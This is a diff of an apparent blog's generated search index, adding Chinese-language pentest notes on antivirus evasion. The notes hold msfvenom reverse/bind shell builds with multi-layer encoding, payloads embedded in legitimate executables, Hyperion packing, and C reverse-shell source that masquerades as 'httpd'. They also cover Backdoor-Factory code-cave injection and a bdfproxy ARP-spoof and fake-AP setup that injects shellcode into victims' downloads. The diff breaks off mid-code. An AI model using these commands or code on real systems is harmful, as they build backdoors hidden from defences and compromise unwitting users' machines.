@@ -29,11 +29,11 @@
     
     
     <entry>
-      <title>msfvenom后门生成及Hyperion加密</title>
-      <link href="/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
-      <url>/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</url>
+      <title>Backdoor-factory后门工厂免杀工具及bdfproxy</title>
+      <link href="/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/"/>
+      <url>/2016/08/08/Avoid_Killing/Backdoor-factory%E5%90%8E%E9%97%A8%E5%B7%A5%E5%8E%82%E5%85%8D%E6%9D%80%E5%B7%A5%E5%85%B7/</url>
       
-        <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> *)<span class="number">0</span>); <span class="comment">//precess httpd</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>windows.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"># 未修正错误</span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;winsock2.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">pragma</span> comment(lib,<span class="meta-string">"ws2_32"</span>)</span></span><br><span class="line"></span><br><span class="line">WSADATA wsaData;</span><br><span class="line">SOCKET Winsock;</span><br><span class="line">SOOKET Sock;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">hax</span>;</span></span><br><span class="line"><span class="keyword">char</span> ip_addr[<span class="number">16</span>];</span><br><span class="line">STARTUPINFO ini_processo;</span><br><span class="line">PROCESS_INFORMATION processo_info;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"><span class="title">WSAStartup</span><span class="params">(MAKEWORD(<span class="number">2</span>,<span class="number">2</span>), wsaData)</span></span>;</span><br><span class="line">winsock=WSASoket(AF_INET,SOCK_STREAM,IPPROTO_TCP,<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>,(<span class="keyword">unsigned</span> <span class="keyword">int</span>)<span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;<span class="built_in">fprintf</span>(<span class="built_in">stderr</span>,<span class="string">"Uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>;) <span class="built_in">exit</span>(<span class="number">1</span>);&#125;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">hostent</span> *<span class="title">host</span>;</span></span><br><span class="line">host = gethostbyname(argv [<span class="number">1</span>] );</span><br><span class="line"><span class="built_in">strcpy</span>(ip_addr,inet_ntoa(*((struct in_addr *)host-&gt;h_addr)));</span><br><span class="line"></span><br><span class="line">hax.sin_family = AF_INET;</span><br><span class="line">hax.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">hax.sin_addr.s_addr = inet_addr(ip_addr);</span><br><span class="line"></span><br><span class="line">WSAConnect(Winsock,(SOCKADDR* &amp;hax,<span class="keyword">sizeof</span>(hax),<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>;</span><br><span class="line"><span class="built_in">memset</span>(&amp;ini_processo,<span class="number">0</span>,<span class="keyword">sizeof</span>(ini_processo));</span><br><span class="line">ini_processo.cb = <span class="keyword">sizeof</span>(ini_processo);</span><br><span class="line">ini_processo.dwFlags = START_USESTDHANDLES;</span><br><span class="line">ini_processo.hStdInput = ini_processo.hStdOutput = ini_processo.hStdError = (HANDLE)Winsock;</span><br><span class="line">CreateProcess(<span class="literal">NULL</span>,<span class="string">"cmd exe"</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,TRUE,<span class="number">0</span>,<span class="literal">NULL</span>,<span class="literal">NULL</span>,&amp;ini_processo,&amp;process_info);</span><br></pre></td></tr></table></figure>]]></content>
+        <content type="html"><![CDATA[<blockquote><h3 id="Backdoor-Factory"><a href="#Backdoor-Factory" class="headerlink" title="Backdoor-Factory"></a><strong>Backdoor-Factory</strong></h3></blockquote><p><strong>Patch</strong></p><ul><li>通过替换EXE,DLL,注册表等方法修复系统漏洞或问题的方法</li><li>BdF:向二进制文件中增加或者删除代码内容<br>  某些受保护的二进制程序无法patch<br>  存在一定概率文件会被patch坏掉</li></ul><p><strong>后门工厂</strong></p><ul><li><p>适用于windows PE x32/x64 和 Linux ELF x32/x64 (OSX)</p></li><li><p>支持MSF payload,自定义payload</p></li><li><p>将shellcode代码patch进模板文件,躲避AV检查</p></li><li><p>Python语言编写</p></li></ul><p><strong>MsF使用的patch方法</strong></p><ul><li><p>覆盖程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp...</code></p></li><li><p>创建新的线程执行shellcode并跳回原程序入口</p><p>  <code>msfvenom -p windows/shell/reverse_tcp -k</code><br>  增加代码片段跳转执行后跳回源程序入口</p></li></ul><p><strong>CTP 方法</strong></p><ul><li>增加新的代码段 section, 与MSF的 <code>-k</code> 方法类似</li><li>使用现有的代码裂缝/洞(code cave)存放 shellcode</li></ul><p><strong>代码洞</strong></p><ul><li>二进制文件中超过两个字节的连续 <code>x00</code> 区域(代码片段间区域)</li><li>根据统计判断代码洞是编译器在进行编译时造成的,不同的编译器造成的代码洞的大小不同</li></ul><pre><code>cp `which cat` .lshexeditor cat</code></pre><ul><li>单个代码洞大小不足以存放完整的shellcode<br>多代码洞跳转(非顺序执行)<br>初期免杀率可达100%<br>结合MsF的stager方法</li></ul><p><strong>Patch选项</strong></p><ul><li>附加代码段</li><li>单代码洞注入</li><li>多代码洞注入</li></ul><h4 id="BdF基本使用"><a href="#BdF基本使用" class="headerlink" title="BdF基本使用"></a><strong>BdF基本使用</strong></h4><p><strong>检查二进制文件是否支持代码注入</strong></p><pre><code>backdoor-factory -f putty.exe –S</code></pre><p><strong>显示可用payload</strong></p><pre><code>backdoor-factory -f putty.exe -s showiat_reverse_tcp_stager_threaded</code></pre><p><strong>查看code cave大小</strong></p><pre><code>backdoor-factory -f putty.exe -c -l 100        #查看100字节的cave大小有多少</code></pre><ul><li>IAT—-import address table<br>指针指向WinAPI地址,被称为thunks(形实转换程序),地址预定义    </li></ul><h5 id="免杀效果对比"><a href="#免杀效果对比" class="headerlink" title="免杀效果对比"></a><strong>免杀效果对比</strong></h5><pre><code>backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666        #单代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -H 1.1.1.1 -P 6666 –J        #多代码洞注入backdoor-factory -f putty.exe -s iat_reverse_tcp_stager_threaded -a -H 192.168.20.8 -P 6666 -a     #新加一个代码片段注入</code></pre><p><strong>与 veil-evasion 集成</strong></p><ul><li>最新版veil默认已经没有backdoor-factory模块.</li></ul><h4 id="BdFproxy"><a href="#BdFproxy" class="headerlink" title="BdFproxy"></a><strong>BdFproxy</strong></h4><p><strong>BdFproxy</strong> (mitmproxy)</p><ul><li>基于流量劫持动态注入shellcode(ARP spoof, DNS spoof, Fake AP)</li></ul><p><strong>步骤</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1#打开路由IP转发功能</span><br><span class="line"></span><br><span class="line">#添加防火墙规则,把访问目标80&#x2F;443端口的流量重定向到8080</span><br><span class="line">iptables -t nat -A PREROUTING -p tcp --dport 80&#x2F;443 -j REDIRECT --toports 8080</span><br><span class="line"></span><br><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent#默认代理模式regular,修改为transparent透明代理</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">arpspoof -i eth0 -t 1.1.1.2 1.1.1.1#执行ARP欺骗一个目标</span><br></pre></td></tr></table></figure><ul><li><p>启动MsF</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfdb init#初始化msf数据库</span><br><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_rescurce.rc</span><br></pre></td></tr></table></figure></li><li><p>Mana 创建 Fack AP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">apt-get install mana</span><br><span class="line">vi &#x2F;etc&#x2F;mana-toolkit&#x2F;hostapd-mana.conf</span><br><span class="line">#修改无线SSID名称</span><br><span class="line"></span><br><span class="line">.&#x2F;usr&#x2F;share&#x2F;mana-toolkit&#x2F;run-mana&#x2F;start-nat-simple.sh</span><br><span class="line">修改wlan0无线网卡适配器并启动</span><br><span class="line">iptables -t nat -A PREROUTING -i $phy -p tcp --dport 80&#x2F;443 -j REDIRECT --to-port 8080</span><br><span class="line">sysctl -w net.ipv4.ip_forward&#x3D;1</span><br></pre></td></tr></table></figure></li><li><p>BdFproxy 代理注入代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">vi &#x2F;etc&#x2F;bdfproxy&#x2F;bdfproxy.cfg</span><br><span class="line">proxyMode &#x3D; transparent</span><br><span class="line">修改侦听IP地址并启动bdfproxy#&#x2F;16</span><br><span class="line"></span><br><span class="line">bdfproxy</span><br></pre></td></tr></table></figure></li><li><p>MsF侦听反弹shell</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfconsole -r &#x2F;usr&#x2F;share&#x2F;bdfproxy&#x2F;bdfproxy_msf_resource.rc</span><br></pre></td></tr></table></figure></li></ul><p><strong>补充内容</strong></p><ul><li>全站HTTPS防注入(微软每个补丁都带马)</li><li>PE文件证书签名可被清除</li><li>PE Header -&gt; Optional Header -&gt; Certificate Table(Address and size)<br>  全部用 0 覆盖<br>  BDF默认清除数字签名</li><li><code>https://live.sysinternals.com</code></li></ul>]]></content>
       
       
       <categories>
@@ -47,17 +47,140 @@
       
         <tags>
             
-            <tag> C </tag>
-            
             <tag> 免杀 </tag>
             
-            <tag> MSF </tag>
+            <tag> backdoor-factory </tag>
             
             <tag> msfvenom </tag>
             
-            <tag> strings </tag>
+            <tag> MSF </tag>
+            
+            <tag> bdfproxy </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> python </tag>
+            
+            <tag> arpspoof </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Veil-catapult注入进程内存执行及shellter免杀</title>
+      <link href="/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/"/>
+      <url>/2016/08/06/Avoid_Killing/Veil-catapult%E6%B3%A8%E5%85%A5%E8%BF%9B%E7%A8%8B%E5%86%85%E5%AD%98%E6%89%A7%E8%A1%8C%E5%8F%8Ashellter%E5%85%8D%E6%9D%80/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="Veil-catapult"><a href="#Veil-catapult" class="headerlink" title="Veil-catapult"></a><strong>Veil-catapult</strong></h3></blockquote><ul><li>也属于 Veil-Framework框架的一部分</li></ul><p><strong>Payload的投递</strong></p><ul><li>集成veil-evasion生成免杀payload或自定义payload</li><li>使用 impacket 上传二进制 payload 文件</li><li>使用 <code>passing-the-hash</code> 触发执行 payload</li></ul><p><strong>Payload直接在内存中运行</strong></p><ul><li>payload不写入硬盘，避免文件型病毒查杀</li></ul><p><strong>Powershell Injector</strong></p><ul><li>适用于windows7及以上系统版本</li></ul><pre><code>veil-catapult         #启动veil-catapult#根据提示进行参数设置#先传了个powershell#然后传了个msf的payload#再用shell调用payload#最后反弹shell</code></pre><p><strong>Barebones Python Injector</strong></p><ul><li>适用于powershell injector 失败的情况下使用</li></ul><p><strong>Sethc backdoor</strong></p><ul><li>用 cmd.exe 替换 C:\Windows\System32\sethc.exe</li></ul><p><strong>Execute custom command</strong></p><ul><li>执行自定义命令</li></ul><p><strong>EXE delivery</strong></p><pre><code>/etc/veil/settings.py</code></pre><h4 id="另一种免杀思路"><a href="#另一种免杀思路" class="headerlink" title="另一种免杀思路"></a><strong>另一种免杀思路</strong></h4><p><strong>传统防病毒查杀原理</strong></p><ul><li>查找文件体特殊字符串,匹配则查杀</li><li>找到触发AV查杀的精确字符串,并将其修改</li></ul><ul><li>将执行程序分片成很多小片段</li><li>将包含MZ头的第一个片段与后续片段依次组合后交给AV查杀</li><li>重复以上步骤,最终精确定位</li></ul><p><strong>二进制文件切片工具</strong> </p><p><code>Evade</code> , <code>Dsplit</code></p><p><strong>16进制文件编辑工具</strong></p><p><code>Hexeditor</code>    , <code>ghex</code>    #ghex是图形化界面</p><pre><code>apt-get install ghex        #kali安装ghex</code></pre><h4 id="shellter"><a href="#shellter" class="headerlink" title="shellter"></a><strong>shellter</strong></h4><ul><li>代码混淆</li><li>定制的编码方式</li><li>多态编码</li><li>集成部分 MSF payload</li><li>目前只支持32位PE程序</li><li>使用正常的EXE文件作为模板,将payload代码加入到模板内<br>模板程序的功能将失效</li></ul><p><strong>kali安装shellter</strong></p><pre><code>apt-get install shellter    #安装使用shellter                    #按照提示使用</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 免杀 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 免杀 </tag>
+            
+            <tag> msfvenom </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> python </tag>
+            
+            <tag> passing-the-hash </tag>
+            
+            <tag> Veil-Framework </tag>
+            
+            <tag> shellter </tag>
+            
+            <tag> ghex </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Veil-evasion自动生成免杀后门</title>
+      <link href="/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/"/>
+      <url>/2016/08/05/Avoid_Killing/Veil-evasion%E8%87%AA%E5%8A%A8%E7%94%9F%E6%88%90%E5%85%8D%E6%9D%80%E5%90%8E%E9%97%A8/</url>
+      
+        <content type="html"><![CDATA[<blockquote><h3 id="Veil-evasion"><a href="#Veil-evasion" class="headerlink" title="Veil-evasion"></a><strong>Veil-evasion</strong></h3></blockquote><ul><li><p>属于 Veil-Framework框架的一部分</p></li><li><p>由 Python 语言编写</p></li><li><p>用于自动生成免杀 payload</p></li><li><p>集成msf payload,支持自定义payload</p></li><li><p>集成各种注入技术</p></li><li><p>集成各种第三方工具</p><p>   <code>Hypersion</code> , <code>PEScrambler</code> , <code>BackDoor Factory</code></p></li><li><p>集成各种开发打包运行环境</p><p>   Python: pyinstaller / py2exe<br>   C#: mono for .NET<br>   C: mingw32<br>   ruby</p></li></ul><p><strong>kali安装使用Veil-evasion</strong></p><pre><code>apt-get install veil-evasionveil        #首次运行安装环境use 1        #使用 Evasionlist        #列出shellcode编号,最新3.1版本默认41个payloaduse 35        #选择使用35号python注入型shellcodeoptions        #查看payload选项set            #可以使用set对payload进行配置generate    #确认配置后生成payload</code></pre><h4 id="MSF利用payload"><a href="#MSF利用payload" class="headerlink" title="MSF利用payload"></a><strong>MSF利用payload</strong></h4><ul><li>使用Veil-evasion生成payload后会在本地路径 <code>/var/lib/veil/output/handlers</code> 下保存MSF的处理程序</li></ul><p><strong>使用MSF侦听连接</strong></p><pre><code>msfconsole -r cat35_handler.rc        #MSF使用Veil生成的配置文件jobssessions                    #运行木马后,查看连接会话sessions -i 1                #进入会话ID,获取交互shell</code></pre>]]></content>
+      
+      
+      <categories>
+          
+          <category> 渗透测试 </category>
+          
+          <category> 免杀 </category>
+          
+      </categories>
+      
+      
+        <tags>
+            
+            <tag> 免杀 </tag>
+            
+            <tag> msfvenom </tag>
+            
+            <tag> MSF </tag>
+            
+            <tag> payload </tag>
+            
+            <tag> python </tag>
+            
+            <tag> Veil-Framework </tag>
             
             <tag> Hyperion </tag>
+            
+            <tag> Veil-evasion </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>msfvenom后门生成及Hyperion加密</title>
+      <link href="/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/"/>
+      <url>/2016/08/04/Avoid_Killing/msfvenom%E5%90%8E%E9%97%A8%E7%94%9F%E6%88%90%E5%8F%8AHyperion%E5%8A%A0%E5%AF%86/</url>
+      
+        <content type="html"><![CDATA[<h4 id="生成反弹shell"><a href="#生成反弹shell" class="headerlink" title="生成反弹shell"></a><strong>生成反弹shell</strong></h4><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe</code></pre><p><strong>生成加密编码反弹shell</strong></p><pre><code>msfvenom -p windows/shell/bind_tcp lhost=1.1.1.1 lport=4444 -f raw -e x86/shikata_ga_nai -i 5 | msfvenom -a x86 --platform windows -e x86/ countdown -i 8  -f raw | msfvenom -a x86 --platform windows -e x86/ shikata_ga_nai -i 9 -b &apos;\x00&apos; -f exe -o a.exe</code></pre><ul><li>比较编码前后的检测率</li></ul><p><strong>查看文件md5值</strong></p><pre><code>md5sum *.exe</code></pre><p><strong>可读字符串查看</strong> 比较</p><pre><code>strings a.exestrings b.exe</code></pre><h4 id="利用模板隐藏shell"><a href="#利用模板隐藏shell" class="headerlink" title="利用模板隐藏shell"></a><strong>利用模板隐藏shell</strong></h4><pre><code>msfvenom -p windows/shell_reverse_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -a x86 --platform win -f exe -o a.exe#利用模板和加密生成msfvenom -p windows/shell/bind_tcp -x /usr/share/windows-binaries/plink.exe lhost=1.1.1.1 lport=4444 -e x86/shikata_ga_nai -i 5 -a x86 --platform win -f exe &gt; b.exe</code></pre><blockquote><h4 id="软件保护"><a href="#软件保护" class="headerlink" title="软件保护"></a><strong>软件保护</strong></h4></blockquote><ul><li>软件开发商为保护版权,采用的混淆和加密技术避免盗版逆向</li><li>常被恶意软件用于免杀目的</li></ul><p><strong>Hyperion</strong> (32bit PE程序加密器)</p><ul><li>Crypter / Container    # 解密器 / PE Loader</li></ul><pre><code>#克隆github源码git clone https://github.com/nullsecuritynet/tools/raw/master/binary/hyperion/release/Hyperion-1.2.zipunzip Hyperion-1.2.zip#加上静态库文件进行编译cd Hyperion-1.2 &amp;&amp; i686-w64-mingw32-g++ -static-libgcc -static-libstdc++ Src/Crypter/*.cpp -o h.exe#安装wine32运行环境dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install wine32#生成后门msfvenom -p windows/shell/reverse_tcp lhost=192.168.1.15 lport=4444 --platform win -e x86/shikata_ga_nai -a x86 -f exe -o a.exe#使用Hyperion后门加壳wine h.exe a.exe b.exe</code></pre><p><strong>Windows reverse shell</strong></p><pre><code>wine gcc.exe windows.c -o windows.exe -lws2_32</code></pre><p><strong>Linux shell</strong></p><pre><code>gcc linux_revers_shell.c -o linux</code></pre><p><strong>linux_revers_shell.c</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;arpa/inet.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;netinet/in.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sockaddr_in</span> <span class="title">sock</span>;</span></span><br><span class="line"><span class="keyword">int</span> s;</span><br><span class="line"><span class="keyword">if</span> (argc != <span class="number">3</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"uso: &lt;rhost&gt; &lt;rport&gt;\n"</span>); <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line">sock.sin_family  = AF_INET;</span><br><span class="line">sock.sin_port = htons(atoi(argv[<span class="number">2</span>]));</span><br><span class="line">sock.sin_addr.s_addr = inet_addr(argv[<span class="number">1</span>]);</span><br><span class="line">s = socket(AF_INET, SOCK_STREAM, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="built_in">connect</span>(s,(struct sockaddr_in *)&amp;sock, <span class="keyword">sizeof</span>(struct sockaddr_in));</span><br><span class="line"></span><br><span class="line">dup2(s,<span class="number">0</span>);</span><br><span class="line">dup2(s,<span class="number">1</span>);</span><br><span class="line">dup2(s,<span class="number">2</span>);</span><br><span class="line">execl(<span class="string">"/bin/sh"</span>,<span class="string">"httpd"</span>,(<span class="keyword">char</span> 